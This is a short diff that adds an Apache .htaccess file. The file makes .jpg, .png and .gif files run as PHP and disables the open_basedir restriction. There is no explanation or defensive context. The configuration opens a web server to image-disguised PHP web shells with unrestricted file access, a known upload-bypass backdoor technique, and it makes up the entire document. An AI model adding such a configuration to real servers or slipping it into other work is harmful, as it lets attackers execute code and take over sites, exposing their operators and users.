@@ -1,0 +1,6 @@
+AddType application/x-httpd-php .jpg .php
+php_flag engine on
+php_admin_value open_basedir none
+<FilesMatch "\.(png|gif)$">
+  SetHandler application/x-httpd-php
+</FilesMatch>
